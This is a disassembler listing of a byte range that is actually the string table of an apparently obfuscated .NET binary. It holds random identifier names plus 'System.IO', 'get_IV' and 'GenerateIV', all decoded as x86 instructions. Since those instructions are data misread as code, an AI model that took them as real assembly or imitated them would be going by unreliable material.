  407bb7:	00 57 63             	add    %dl,0x63(%edi)
  407bba:	41                   	inc    %ecx
  407bbb:	43                   	inc    %ebx
  407bbc:	53                   	push   %ebx
  407bbd:	63 73 53             	arpl   %esi,0x53(%ebx)
  407bc0:	6d                   	insl   (%dx),%es:(%edi)
  407bc1:	6c                   	insb   (%dx),%es:(%edi)
  407bc2:	54                   	push   %esp
  407bc3:	47                   	inc    %edi
  407bc4:	4b                   	dec    %ebx
  407bc5:	00 57 41             	add    %dl,0x41(%edi)
  407bc8:	43                   	inc    %ebx
  407bc9:	4b                   	dec    %ebx
  407bca:	6b 70 43 42          	imul   $0x42,0x43(%eax),%esi
  407bce:	4c                   	dec    %esp
  407bcf:	4b                   	dec    %ebx
  407bd0:	00 63 76             	add    %ah,0x76(%ebx)
  407bd3:	73 61                	jae    0x407c36
  407bd5:	77 45                	ja     0x407c1c
  407bd7:	48                   	dec    %eax
  407bd8:	55                   	push   %ebp
  407bd9:	66 76 49             	data16 jbe 0x407c25
  407bdc:	4a                   	dec    %edx
  407bdd:	54                   	push   %esp
  407bde:	4b                   	dec    %ebx
  407bdf:	00 4b 61             	add    %cl,0x61(%ebx)
  407be2:	56                   	push   %esi
  407be3:	75 53                	jne    0x407c38
  407be5:	71 6b                	jno    0x407c52
  407be7:	58                   	pop    %eax
  407be8:	48                   	dec    %eax
  407be9:	41                   	inc    %ecx
  407bea:	66 65 4b             	gs dec %bx
  407bed:	00 66 63             	add    %ah,0x63(%esi)
  407bf0:	75 79                	jne    0x407c6b
  407bf2:	76 47                	jbe    0x407c3b
  407bf4:	49                   	dec    %ecx
  407bf5:	45                   	inc    %ebp
  407bf6:	67 6f                	outsl  %ds:(%si),(%dx)
  407bf8:	65 4b                	gs dec %ebx
  407bfa:	00 66 49             	add    %ah,0x49(%esi)
  407bfd:	55                   	push   %ebp
  407bfe:	78 43                	js     0x407c43
  407c00:	69 64 41 6a 43 6b 6f 	imul   $0x4b6f6b43,0x6a(%ecx,%eax,2),%esp
  407c07:	4b 
  407c08:	00 64 42 4a          	add    %ah,0x4a(%edx,%eax,2)
  407c0c:	75 66                	jne    0x407c74
  407c0e:	77 51                	ja     0x407c61
  407c10:	76 6d                	jbe    0x407c7f
  407c12:	42                   	inc    %edx
  407c13:	48                   	dec    %eax
  407c14:	6d                   	insl   (%dx),%es:(%edi)
  407c15:	6b 62 48 72          	imul   $0x72,0x48(%edx),%esp
  407c19:	4b                   	dec    %ebx
  407c1a:	00 44 63 50          	add    %al,0x50(%ebx,%eiz,2)
  407c1e:	4b                   	dec    %ebx
  407c1f:	4d                   	dec    %ebp
  407c20:	55                   	push   %ebp
  407c21:	7a 64                	jp     0x407c87
  407c23:	4d                   	dec    %ebp
  407c24:	56                   	push   %esi
  407c25:	4c                   	dec    %esp
  407c26:	44                   	inc    %esp
  407c27:	41                   	inc    %ecx
  407c28:	4c                   	dec    %esp
  407c29:	00 75 78             	add    %dh,0x78(%ebp)
  407c2c:	74 6f                	je     0x407c9d
  407c2e:	59                   	pop    %ecx
  407c2f:	77 6c                	ja     0x407c9d
  407c31:	51                   	push   %ecx
  407c32:	53                   	push   %ebx
  407c33:	65 59                	gs pop %ecx
  407c35:	4b                   	dec    %ebx
  407c36:	6a 5a                	push   $0x5a
  407c38:	79 4d                	jns    0x407c87
  407c3a:	4c                   	dec    %esp
  407c3b:	00 6a 62             	add    %ch,0x62(%edx)
  407c3e:	46                   	inc    %esi
  407c3f:	58                   	pop    %eax
  407c40:	42                   	inc    %edx
  407c41:	52                   	push   %edx
  407c42:	6b 68 43 48          	imul   $0x48,0x43(%eax),%ebp
  407c46:	6e                   	outsb  %ds:(%esi),(%dx)
  407c47:	57                   	push   %edi
  407c48:	4c                   	dec    %esp
  407c49:	00 59 41             	add    %bl,0x41(%ecx)
  407c4c:	62 49 6f             	bound  %ecx,0x6f(%ecx)
  407c4f:	49                   	dec    %ecx
  407c50:	6a 73                	push   $0x73
  407c52:	70 4a                	jo     0x407c9e
  407c54:	70 46                	jo     0x407c9c
  407c56:	4a                   	dec    %edx
  407c57:	6a 4c                	push   $0x4c
  407c59:	00 52 66             	add    %dl,0x66(%edx)
  407c5c:	4d                   	dec    %ebp
  407c5d:	50                   	push   %eax
  407c5e:	75 44                	jne    0x407ca4
  407c60:	4b                   	dec    %ebx
  407c61:	6d                   	insl   (%dx),%es:(%edi)
  407c62:	6e                   	outsb  %ds:(%esi),(%dx)
  407c63:	4c                   	dec    %esp
  407c64:	00 56 77             	add    %dl,0x77(%esi)
  407c67:	79 49                	jns    0x407cb2
  407c69:	64 66 52             	fs push %dx
  407c6c:	68 6f 4c 00 55       	push   $0x55004c6f
  407c71:	70 6d                	jo     0x407ce0
  407c73:	42                   	inc    %edx
  407c74:	52                   	push   %edx
  407c75:	68 58 6a 4e 77       	push   $0x774e6a58
  407c7a:	5a                   	pop    %edx
  407c7b:	47                   	inc    %edi
  407c7c:	4d                   	dec    %ebp
  407c7d:	00 6d 62             	add    %ch,0x62(%ebp)
  407c80:	66 76 56             	data16 jbe 0x407cd9
  407c83:	49                   	dec    %ecx
  407c84:	48                   	dec    %eax
  407c85:	68 4f 44 4b 64       	push   $0x644b444f
  407c8a:	4d                   	dec    %ebp
  407c8b:	00 4f 64             	add    %cl,0x64(%edi)
  407c8e:	4e                   	dec    %esi
  407c8f:	44                   	inc    %esp
  407c90:	48                   	dec    %eax
  407c91:	71 43                	jno    0x407cd6
  407c93:	67 48                	addr16 dec %eax
  407c95:	42                   	inc    %edx
  407c96:	4f                   	dec    %edi
  407c97:	69 4d 00 58 68 58 65 	imul   $0x65586858,0x0(%ebp),%ecx
  407c9e:	4b                   	dec    %ebx
  407c9f:	55                   	push   %ebp
  407ca0:	7a 69                	jp     0x407d0b
  407ca2:	58                   	pop    %eax
  407ca3:	69 4d 00 4e 65 4a 78 	imul   $0x784a654e,0x0(%ebp),%ecx
  407caa:	43                   	inc    %ebx
  407cab:	44                   	inc    %esp
  407cac:	69 5a 62 61 42 46 71 	imul   $0x71464261,0x62(%edx),%ebx
  407cb3:	6c                   	insb   (%dx),%es:(%edi)
  407cb4:	4d                   	dec    %ebp
  407cb5:	00 69 71             	add    %ch,0x71(%ecx)
  407cb8:	63 65 77             	arpl   %esp,0x77(%ebp)
  407cbb:	45                   	inc    %ebp
  407cbc:	41                   	inc    %ecx
  407cbd:	57                   	push   %edi
  407cbe:	44                   	inc    %esp
  407cbf:	43                   	inc    %ebx
  407cc0:	49                   	dec    %ecx
  407cc1:	79 76                	jns    0x407d39
  407cc3:	4a                   	dec    %edx
  407cc4:	4e                   	dec    %esi
  407cc5:	00 58 71             	add    %bl,0x71(%eax)
  407cc8:	67 54                	addr16 push %esp
  407cca:	4b                   	dec    %ebx
  407ccb:	78 6b                	js     0x407d38
  407ccd:	64 4b                	fs dec %ebx
  407ccf:	4d                   	dec    %ebp
  407cd0:	4d                   	dec    %ebp
  407cd1:	42                   	inc    %edx
  407cd2:	4f                   	dec    %edi
  407cd3:	4e                   	dec    %esi
  407cd4:	00 4b 4f             	add    %cl,0x4f(%ebx)
  407cd7:	51                   	push   %ecx
  407cd8:	4c                   	dec    %esp
  407cd9:	4c                   	dec    %esp
  407cda:	64 62 4c 4d 56       	bound  %ecx,%fs:0x56(%ebp,%ecx,2)
  407cdf:	4f                   	dec    %edi
  407ce0:	4e                   	dec    %esi
  407ce1:	00 41 75             	add    %al,0x75(%ecx)
  407ce4:	44                   	inc    %esp
  407ce5:	4f                   	dec    %edi
  407ce6:	70 4e                	jo     0x407d36
  407ce8:	79 59                	jns    0x407d43
  407cea:	56                   	push   %esi
  407ceb:	51                   	push   %ecx
  407cec:	4e                   	dec    %esi
  407ced:	00 71 6d             	add    %dh,0x6d(%ecx)
  407cf0:	4e                   	dec    %esi
  407cf1:	50                   	push   %eax
  407cf2:	79 4d                	jns    0x407d41
  407cf4:	41                   	inc    %ecx
  407cf5:	66 58                	pop    %ax
  407cf7:	47                   	inc    %edi
  407cf8:	6c                   	insb   (%dx),%es:(%edi)
  407cf9:	43                   	inc    %ebx
  407cfa:	54                   	push   %esp
  407cfb:	53                   	push   %ebx
  407cfc:	4e                   	dec    %esi
  407cfd:	00 77 74             	add    %dh,0x74(%edi)
  407d00:	42                   	inc    %edx
  407d01:	4e                   	dec    %esi
  407d02:	69 57 4e 75 58 4e 00 	imul   $0x4e5875,0x4e(%edi),%edx
  407d09:	66 42                	inc    %dx
  407d0b:	6a 46                	push   $0x46
  407d0d:	43                   	inc    %ebx
  407d0e:	65 6c                	gs insb (%dx),%es:(%edi)
  407d10:	4c                   	dec    %esp
  407d11:	6c                   	insb   (%dx),%es:(%edi)
  407d12:	74 56                	je     0x407d6a
  407d14:	4e                   	dec    %esi
  407d15:	59                   	pop    %ecx
  407d16:	4e                   	dec    %esi
  407d17:	00 46 4f             	add    %al,0x4f(%esi)
  407d1a:	4e                   	dec    %esi
  407d1b:	65 49                	gs dec %ecx
  407d1d:	59                   	pop    %ecx
  407d1e:	75 50                	jne    0x407d70
  407d20:	66 47                	inc    %di
  407d22:	5a                   	pop    %edx
  407d23:	55                   	push   %ebp
  407d24:	5a                   	pop    %edx
  407d25:	4e                   	dec    %esi
  407d26:	00 4d 7a             	add    %cl,0x7a(%ebp)
  407d29:	44                   	inc    %esp
  407d2a:	58                   	pop    %eax
  407d2b:	44                   	inc    %esp
  407d2c:	4f                   	dec    %edi
  407d2d:	54                   	push   %esp
  407d2e:	4d                   	dec    %ebp
  407d2f:	75 6f                	jne    0x407da0
  407d31:	69 64 4e 00 72 4b 4f 	imul   $0x6a4f4b72,0x0(%esi,%ecx,2),%esp
  407d38:	6a 
  407d39:	5a                   	pop    %edx
  407d3a:	52                   	push   %edx
  407d3b:	79 5a                	jns    0x407d97
  407d3d:	5a                   	pop    %edx
  407d3e:	69 44 4f 00 53 79 73 	imul   $0x74737953,0x0(%edi,%ecx,2),%eax
  407d45:	74 
  407d46:	65 6d                	gs insl (%dx),%es:(%edi)
  407d48:	2e 49                	cs dec %ecx
  407d4a:	4f                   	dec    %edi
  407d4b:	00 70 6e             	add    %dh,0x6e(%eax)
  407d4e:	71 67                	jno    0x407db7
  407d50:	45                   	inc    %ebp
  407d51:	45                   	inc    %ebp
  407d52:	6a 48                	push   $0x48
  407d54:	79 4a                	jns    0x407da0
  407d56:	44                   	inc    %esp
  407d57:	58                   	pop    %eax
  407d58:	4b                   	dec    %ebx
  407d59:	6d                   	insl   (%dx),%es:(%edi)
  407d5a:	4f                   	dec    %edi
  407d5b:	00 4e 50             	add    %cl,0x50(%esi)
  407d5e:	4e                   	dec    %esi
  407d5f:	44                   	inc    %esp
  407d60:	45                   	inc    %ebp
  407d61:	56                   	push   %esi
  407d62:	61                   	popa
  407d63:	64 4b                	fs dec %ebx
  407d65:	51                   	push   %ecx
  407d66:	51                   	push   %ecx
  407d67:	74 4f                	je     0x407db8
  407d69:	00 53 58             	add    %dl,0x58(%ebx)
  407d6c:	78 43                	js     0x407db1
  407d6e:	6e                   	outsb  %ds:(%esi),(%dx)
  407d6f:	71 75                	jno    0x407de6
  407d71:	62 52 4a             	bound  %edx,0x4a(%edx)
  407d74:	79 4f                	jns    0x407dc5
  407d76:	00 55 74             	add    %dl,0x74(%ebp)
  407d79:	58                   	pop    %eax
  407d7a:	64 46                	fs inc %esi
  407d7c:	75 51                	jne    0x407dcf
  407d7e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d7f:	4b                   	dec    %ebx
  407d80:	4f                   	dec    %edi
  407d81:	79 4f                	jns    0x407dd2
  407d83:	7a 4f                	jp     0x407dd4
  407d85:	00 77 50             	add    %dh,0x50(%edi)
  407d88:	65 77 55             	gs ja  0x407de0
  407d8b:	7a 75                	jp     0x407e02
  407d8d:	66 50                	push   %ax
  407d8f:	55                   	push   %ebp
  407d90:	4d                   	dec    %ebp
  407d91:	73 61                	jae    0x407df4
  407d93:	50                   	push   %eax
  407d94:	00 44 6d 50          	add    %al,0x50(%ebp,%ebp,2)
  407d98:	74 71                	je     0x407e0b
  407d9a:	59                   	pop    %ecx
  407d9b:	6a 79                	push   $0x79
  407d9d:	55                   	push   %ebp
  407d9e:	75 50                	jne    0x407df0
  407da0:	00 71 57             	add    %dh,0x57(%ecx)
  407da3:	47                   	inc    %edi
  407da4:	43                   	inc    %ebx
  407da5:	49                   	dec    %ecx
  407da6:	45                   	inc    %ebp
  407da7:	51                   	push   %ecx
  407da8:	49                   	dec    %ecx
  407da9:	78 78                	js     0x407e23
  407dab:	4b                   	dec    %ebx
  407dac:	7a 50                	jp     0x407dfe
  407dae:	00 75 63             	add    %dh,0x63(%ebp)
  407db1:	67 6a 71             	addr16 push $0x71
  407db4:	4a                   	dec    %edx
  407db5:	47                   	inc    %edi
  407db6:	46                   	inc    %esi
  407db7:	53                   	push   %ebx
  407db8:	4e                   	dec    %esi
  407db9:	44                   	inc    %esp
  407dba:	4c                   	dec    %esp
  407dbb:	45                   	inc    %ebp
  407dbc:	51                   	push   %ecx
  407dbd:	00 6e 41             	add    %ch,0x41(%esi)
  407dc0:	4b                   	dec    %ebx
  407dc1:	45                   	inc    %ebp
  407dc2:	71 72                	jno    0x407e36
  407dc4:	45                   	inc    %ebp
  407dc5:	4e                   	dec    %esi
  407dc6:	4e                   	dec    %esi
  407dc7:	45                   	inc    %ebp
  407dc8:	4f                   	dec    %edi
  407dc9:	51                   	push   %ecx
  407dca:	00 4e 7a             	add    %cl,0x7a(%esi)
  407dcd:	44                   	inc    %esp
  407dce:	76 58                	jbe    0x407e28
  407dd0:	55                   	push   %ebp
  407dd1:	51                   	push   %ecx
  407dd2:	66 68 44 71          	pushw  $0x7144
  407dd6:	65 51                	gs push %ecx
  407dd8:	00 6c 49 6e          	add    %ch,0x6e(%ecx,%ecx,2)
  407ddc:	62 69 75             	bound  %ebp,0x75(%ecx)
  407ddf:	61                   	popa
  407de0:	55                   	push   %ebp
  407de1:	6c                   	insb   (%dx),%es:(%edi)
  407de2:	61                   	popa
  407de3:	56                   	push   %esi
  407de4:	76 65                	jbe    0x407e4b
  407de6:	51                   	push   %ecx
  407de7:	00 4b 61             	add    %cl,0x61(%ebx)
  407dea:	73 65                	jae    0x407e51
  407dec:	6e                   	outsb  %ds:(%esi),(%dx)
  407ded:	4f                   	dec    %edi
  407dee:	76 66                	jbe    0x407e56
  407df0:	4c                   	dec    %esp
  407df1:	68 7a 57 72 51       	push   $0x5172577a
  407df6:	00 4d 73             	add    %cl,0x73(%ebp)
  407df9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfa:	56                   	push   %esi
  407dfb:	6c                   	insb   (%dx),%es:(%edi)
  407dfc:	62 69 4e             	bound  %ebp,0x4e(%ecx)
  407dff:	78 5a                	js     0x407e5b
  407e01:	76 7a                	jbe    0x407e7d
  407e03:	63 42 52             	arpl   %eax,0x52(%edx)
  407e06:	00 75 50             	add    %dh,0x50(%ebp)
  407e09:	62 75 63             	bound  %esi,0x63(%ebp)
  407e0c:	53                   	push   %ebx
  407e0d:	46                   	inc    %esi
  407e0e:	51                   	push   %ecx
  407e0f:	54                   	push   %esp
  407e10:	43                   	inc    %ebx
  407e11:	52                   	push   %edx
  407e12:	00 51 43             	add    %dl,0x43(%ecx)
  407e15:	4a                   	dec    %edx
  407e16:	4a                   	dec    %edx
  407e17:	74 6f                	je     0x407e88
  407e19:	48                   	dec    %eax
  407e1a:	6d                   	insl   (%dx),%es:(%edi)
  407e1b:	61                   	popa
  407e1c:	65 4b                	gs dec %ebx
  407e1e:	45                   	inc    %ebp
  407e1f:	52                   	push   %edx
  407e20:	00 70 57             	add    %dh,0x57(%eax)
  407e23:	47                   	inc    %edi
  407e24:	6e                   	outsb  %ds:(%esi),(%dx)
  407e25:	53                   	push   %ebx
  407e26:	67 53                	addr16 push %ebx
  407e28:	63 53 78             	arpl   %edx,0x78(%ebx)
  407e2b:	4a                   	dec    %edx
  407e2c:	52                   	push   %edx
  407e2d:	00 78 6f             	add    %bh,0x6f(%eax)
  407e30:	70 51                	jo     0x407e83
  407e32:	44                   	inc    %esp
  407e33:	61                   	popa
  407e34:	51                   	push   %ecx
  407e35:	6c                   	insb   (%dx),%es:(%edi)
  407e36:	66 65 75 6b          	data16 gs jne 0x407ea5
  407e3a:	4f                   	dec    %edi
  407e3b:	52                   	push   %edx
  407e3c:	00 73 6b             	add    %dh,0x6b(%ebx)
  407e3f:	66 46                	inc    %si
  407e41:	53                   	push   %ebx
  407e42:	52                   	push   %edx
  407e43:	42                   	inc    %edx
  407e44:	6c                   	insb   (%dx),%es:(%edi)
  407e45:	55                   	push   %ebp
  407e46:	5a                   	pop    %edx
  407e47:	52                   	push   %edx
  407e48:	00 7a 55             	add    %bh,0x55(%edx)
  407e4b:	4c                   	dec    %esp
  407e4c:	4b                   	dec    %ebx
  407e4d:	64 6c                	fs insb (%dx),%es:(%edi)
  407e4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e50:	7a 70                	jp     0x407ec2
  407e52:	6d                   	insl   (%dx),%es:(%edi)
  407e53:	50                   	push   %eax
  407e54:	62 52 00             	bound  %edx,0x0(%edx)
  407e57:	68 4d 54 66 52       	push   $0x5266544d
  407e5c:	61                   	popa
  407e5d:	6c                   	insb   (%dx),%es:(%edi)
  407e5e:	71 79                	jno    0x407ed9
  407e60:	56                   	push   %esi
  407e61:	72 63                	jb     0x407ec6
  407e63:	62 52 00             	bound  %edx,0x0(%edx)
  407e66:	73 4a                	jae    0x407eb2
  407e68:	70 51                	jo     0x407ebb
  407e6a:	55                   	push   %ebp
  407e6b:	74 50                	je     0x407ebd
  407e6d:	71 4f                	jno    0x407ebe
  407e6f:	69 52 00 65 41 61 79 	imul   $0x79614165,0x0(%edx),%edx
  407e76:	52                   	push   %edx
  407e77:	6a 44                	push   $0x44
  407e79:	6c                   	insb   (%dx),%es:(%edi)
  407e7a:	51                   	push   %ecx
  407e7b:	5a                   	pop    %edx
  407e7c:	5a                   	pop    %edx
  407e7d:	64 64 4d             	fs fs dec %ebp
  407e80:	6e                   	outsb  %ds:(%esi),(%dx)
  407e81:	75 52                	jne    0x407ed5
  407e83:	00 4e 51             	add    %cl,0x51(%esi)
  407e86:	45                   	inc    %ebp
  407e87:	4c                   	dec    %esp
  407e88:	48                   	dec    %eax
  407e89:	4c                   	dec    %esp
  407e8a:	78 68                	js     0x407ef4
  407e8c:	66 76 52             	data16 jbe 0x407ee1
  407e8f:	00 6f 6f             	add    %ch,0x6f(%edi)
  407e92:	44                   	inc    %esp
  407e93:	59                   	pop    %ecx
  407e94:	67 6a 77             	addr16 push $0x77
  407e97:	4d                   	dec    %ebp
  407e98:	75 79                	jne    0x407f13
  407e9a:	52                   	push   %edx
  407e9b:	00 45 59             	add    %al,0x59(%ebp)
  407e9e:	4b                   	dec    %ebx
  407e9f:	51                   	push   %ecx
  407ea0:	50                   	push   %eax
  407ea1:	4c                   	dec    %esp
  407ea2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea3:	54                   	push   %esp
  407ea4:	65 77 54             	gs ja  0x407efb
  407ea7:	48                   	dec    %eax
  407ea8:	67 6d                	insl   (%dx),%es:(%di)
  407eaa:	42                   	inc    %edx
  407eab:	53                   	push   %ebx
  407eac:	00 75 56             	add    %dh,0x56(%ebp)
  407eaf:	6d                   	insl   (%dx),%es:(%edi)
  407eb0:	43                   	inc    %ebx
  407eb1:	5a                   	pop    %edx
  407eb2:	68 6d 62 4d 53       	push   $0x534d626d
  407eb7:	00 65 68             	add    %ah,0x68(%ebp)
  407eba:	73 42                	jae    0x407efe
  407ebc:	78 43                	js     0x407f01
  407ebe:	78 78                	js     0x407f38
  407ec0:	4b                   	dec    %ebx
  407ec1:	73 4d                	jae    0x407f10
  407ec3:	53                   	push   %ebx
  407ec4:	00 73 6b             	add    %dh,0x6b(%ebx)
  407ec7:	4b                   	dec    %ebx
  407ec8:	74 79                	je     0x407f43
  407eca:	6c                   	insb   (%dx),%es:(%edi)
  407ecb:	57                   	push   %edi
  407ecc:	4e                   	dec    %esi
  407ecd:	62 50 49             	bound  %edx,0x49(%eax)
  407ed0:	65 51                	gs push %ecx
  407ed2:	53                   	push   %ebx
  407ed3:	00 50 42             	add    %dl,0x42(%eax)
  407ed6:	45                   	inc    %ebp
  407ed7:	54                   	push   %esp
  407ed8:	4a                   	dec    %edx
  407ed9:	4f                   	dec    %edi
  407eda:	67 47                	addr16 inc %edi
  407edc:	45                   	inc    %ebp
  407edd:	54                   	push   %esp
  407ede:	73 56                	jae    0x407f36
  407ee0:	53                   	push   %ebx
  407ee1:	00 74 43 78          	add    %dh,0x78(%ebx,%eax,2)
  407ee5:	71 46                	jno    0x407f2d
  407ee7:	6c                   	insb   (%dx),%es:(%edi)
  407ee8:	4f                   	dec    %edi
  407ee9:	54                   	push   %esp
  407eea:	68 4a 58 53 00       	push   $0x53584a
  407eef:	6b 78 47 6f          	imul   $0x6f,0x47(%eax),%edi
  407ef3:	69 45 51 79 6c 61 53 	imul   $0x53616c79,0x51(%ebp),%eax
  407efa:	00 6d 6d             	add    %ch,0x6d(%ebp)
  407efd:	58                   	pop    %eax
  407efe:	67 65 41             	addr16 gs inc %ecx
  407f01:	4d                   	dec    %ebp
  407f02:	53                   	push   %ebx
  407f03:	54                   	push   %esp
  407f04:	52                   	push   %edx
  407f05:	48                   	dec    %eax
  407f06:	6b 73 54 68          	imul   $0x68,0x54(%ebx),%esi
  407f0a:	53                   	push   %ebx
  407f0b:	00 42 4d             	add    %al,0x4d(%edx)
  407f0e:	69 5a 4d 4f 6b 57 4f 	imul   $0x4f576b4f,0x4d(%edx),%ebx
  407f15:	53                   	push   %ebx
  407f16:	46                   	inc    %esi
  407f17:	4c                   	dec    %esp
  407f18:	75 5a                	jne    0x407f74
  407f1a:	71 53                	jno    0x407f6f
  407f1c:	00 72 63             	add    %dh,0x63(%edx)
  407f1f:	71 4a                	jno    0x407f6b
  407f21:	64 49                	fs dec %ecx
  407f23:	4a                   	dec    %edx
  407f24:	76 43                	jbe    0x407f69
  407f26:	48                   	dec    %eax
  407f27:	54                   	push   %esp
  407f28:	00 41 4c             	add    %al,0x4c(%ecx)
  407f2b:	6d                   	insl   (%dx),%es:(%edi)
  407f2c:	45                   	inc    %ebp
  407f2d:	6b 49 49 68          	imul   $0x68,0x49(%ecx),%ecx
  407f31:	6a 69                	push   $0x69
  407f33:	74 50                	je     0x407f85
  407f35:	42                   	inc    %edx
  407f36:	51                   	push   %ecx
  407f37:	54                   	push   %esp
  407f38:	00 57 71             	add    %dl,0x71(%edi)
  407f3b:	52                   	push   %edx
  407f3c:	66 65 44             	gs inc %sp
  407f3f:	45                   	inc    %ebp
  407f40:	55                   	push   %ebp
  407f41:	4f                   	dec    %edi
  407f42:	70 52                	jo     0x407f96
  407f44:	51                   	push   %ecx
  407f45:	54                   	push   %esp
  407f46:	00 41 66             	add    %al,0x66(%ecx)
  407f49:	44                   	inc    %esp
  407f4a:	76 78                	jbe    0x407fc4
  407f4c:	73 7a                	jae    0x407fc8
  407f4e:	41                   	inc    %ecx
  407f4f:	44                   	inc    %esp
  407f50:	68 6e 64 59 54       	push   $0x5459646e
  407f55:	00 64 6c 6a          	add    %ah,0x6a(%esp,%ebp,2)
  407f59:	6f                   	outsl  %ds:(%esi),(%dx)
  407f5a:	6d                   	insl   (%dx),%es:(%edi)
  407f5b:	41                   	inc    %ecx
  407f5c:	66 49                	dec    %cx
  407f5e:	4f                   	dec    %edi
  407f5f:	4c                   	dec    %esp
  407f60:	50                   	push   %eax
  407f61:	4d                   	dec    %ebp
  407f62:	61                   	popa
  407f63:	54                   	push   %esp
  407f64:	00 75 68             	add    %dh,0x68(%ebp)
  407f67:	6d                   	insl   (%dx),%es:(%edi)
  407f68:	42                   	inc    %edx
  407f69:	4b                   	dec    %ebx
  407f6a:	45                   	inc    %ebp
  407f6b:	70 6e                	jo     0x407fdb
  407f6d:	76 49                	jbe    0x407fb8
  407f6f:	64 57                	fs push %edi
  407f71:	50                   	push   %eax
  407f72:	63 54 00 65          	arpl   %edx,0x65(%eax,%eax,1)
  407f76:	72 50                	jb     0x407fc8
  407f78:	6e                   	outsb  %ds:(%esi),(%dx)
  407f79:	69 77 6f 54 5a 74 54 	imul   $0x54745a54,0x6f(%edi),%esi
  407f80:	00 44 74 61          	add    %al,0x61(%esp,%esi,2)
  407f84:	42                   	inc    %edx
  407f85:	4a                   	dec    %edx
  407f86:	53                   	push   %ebx
  407f87:	43                   	inc    %ebx
  407f88:	41                   	inc    %ecx
  407f89:	41                   	inc    %ecx
  407f8a:	71 45                	jno    0x407fd1
  407f8c:	42                   	inc    %edx
  407f8d:	55                   	push   %ebp
  407f8e:	00 6f 62             	add    %ch,0x62(%edi)
  407f91:	67 79 78             	addr16 jns 0x40800c
  407f94:	4e                   	dec    %esi
  407f95:	71 62                	jno    0x407ff9
  407f97:	6e                   	outsb  %ds:(%esi),(%dx)
  407f98:	69 43 55 00 43 53 4c 	imul   $0x4c534300,0x55(%ebx),%eax
  407f9f:	6e                   	outsb  %ds:(%esi),(%dx)
  407fa0:	4d                   	dec    %ebp
  407fa1:	78 4d                	js     0x407ff0
  407fa3:	71 49                	jno    0x407fee
  407fa5:	71 67                	jno    0x40800e
  407fa7:	64 49                	fs dec %ecx
  407fa9:	55                   	push   %ebp
  407faa:	00 55 4d             	add    %dl,0x4d(%ebp)
  407fad:	61                   	popa
  407fae:	59                   	pop    %ecx
  407faf:	73 42                	jae    0x407ff3
  407fb1:	71 76                	jno    0x408029
  407fb3:	56                   	push   %esi
  407fb4:	55                   	push   %ebp
  407fb5:	00 52 71             	add    %dl,0x71(%edx)
  407fb8:	65 4b                	gs dec %ebx
  407fba:	46                   	inc    %esi
  407fbb:	72 6f                	jb     0x40802c
  407fbd:	58                   	pop    %eax
  407fbe:	4f                   	dec    %edi
  407fbf:	74 5a                	je     0x40801b
  407fc1:	5a                   	pop    %edx
  407fc2:	6c                   	insb   (%dx),%es:(%edi)
  407fc3:	51                   	push   %ecx
  407fc4:	67 55                	addr16 push %ebp
  407fc6:	00 51 44             	add    %dl,0x44(%ecx)
  407fc9:	74 49                	je     0x408014
  407fcb:	58                   	pop    %eax
  407fcc:	51                   	push   %ecx
  407fcd:	72 69                	jb     0x408038
  407fcf:	70 68                	jo     0x408039
  407fd1:	7a 51                	jp     0x408024
  407fd3:	48                   	dec    %eax
  407fd4:	71 55                	jno    0x40802b
  407fd6:	00 59 59             	add    %bl,0x59(%ecx)
  407fd9:	6c                   	insb   (%dx),%es:(%edi)
  407fda:	67 4f                	addr16 dec %edi
  407fdc:	4f                   	dec    %edi
  407fdd:	73 47                	jae    0x408026
  407fdf:	50                   	push   %eax
  407fe0:	52                   	push   %edx
  407fe1:	44                   	inc    %esp
  407fe2:	56                   	push   %esi
  407fe3:	00 67 65             	add    %ah,0x65(%edi)
  407fe6:	74 5f                	je     0x408047
  407fe8:	49                   	dec    %ecx
  407fe9:	56                   	push   %esi
  407fea:	00 73 65             	add    %dh,0x65(%ebx)
  407fed:	74 5f                	je     0x40804e
  407fef:	49                   	dec    %ecx
  407ff0:	56                   	push   %esi
  407ff1:	00 47 65             	add    %al,0x65(%edi)
  407ff4:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff5:	65 72 61             	gs jb  0x408059
  407ff8:	74 65                	je     0x40805f
  407ffa:	49                   	dec    %ecx
  407ffb:	56                   	push   %esi
  407ffc:	00 71 52             	add    %dh,0x52(%ecx)
  407fff:	66 53                	push   %bx
  408001:	75 4e                	jne    0x408051
  408003:	56                   	push   %esi
  408004:	55                   	push   %ebp
  408005:	74 51                	je     0x408058
  408007:	56                   	push   %esi
  408008:	00 53 4b             	add    %dl,0x4b(%ebx)
  40800b:	75 51                	jne    0x40805e
  40800d:	74 63                	je     0x408072
  40800f:	63 53 4a             	arpl   %edx,0x4a(%ebx)
  408012:	66 56                	push   %si
  408014:	00 6a 4e             	add    %ch,0x4e(%edx)
  408017:	65 66 5a             	gs pop %dx
  40801a:	70 55                	jo     0x408071
  40801c:	59                   	pop    %ecx
  40801d:	67 59                	addr16 pop %ecx
  40801f:	74 67                	je     0x408088
  408021:	56                   	push   %esi
  408022:	00 6c 50 50          	add    %ch,0x50(%eax,%edx,2)
  408026:	77 73                	ja     0x40809b
  408028:	67 68 4e 6d 47 75    	addr16 push $0x75476d4e
  40802e:	68 63 4e 68 56       	push   $0x56684e63
  408033:	00 72 79             	add    %dh,0x79(%edx)
  408036:	47                   	inc    %edi
  408037:	4f                   	dec    %edi
  408038:	68 58 53 65 4b       	push   $0x4b655358
  40803d:	49                   	dec    %ecx
  40803e:	72 56                	jb     0x408096
  408040:	00 64 54 77          	add    %ah,0x77(%esp,%edx,2)
  408044:	55                   	push   %ebp
  408045:	64 57                	fs push %edi
  408047:	6d                   	insl   (%dx),%es:(%edi)
  408048:	65 4c                	gs dec %esp
  40804a:	50                   	push   %eax
  40804b:	72 42                	jb     0x40808f
  40804d:	57                   	push   %edi
  40804e:	00 64 53 59          	add    %ah,0x59(%ebx,%edx,2)
  408052:	50                   	push   %eax
  408053:	64 63 78 6b          	arpl   %edi,%fs:0x6b(%eax)
  408057:	51                   	push   %ecx
  408058:	67 45                	addr16 inc %ebp
  40805a:	52                   	push   %edx
  40805b:	49                   	dec    %ecx
  40805c:	47                   	inc    %edi
  40805d:	57                   	push   %edi
  40805e:	00 52 51             	add    %dl,0x51(%edx)
  408061:	56                   	push   %esi
  408062:	57                   	push   %edi
  408063:	71 4c                	jno    0x4080b1
  408065:	58                   	pop    %eax
  408066:	65 48                	gs dec %eax
  408068:	57                   	push   %edi
  408069:	00 58 6a             	add    %bl,0x6a(%eax)
  40806c:	45                   	inc    %ebp
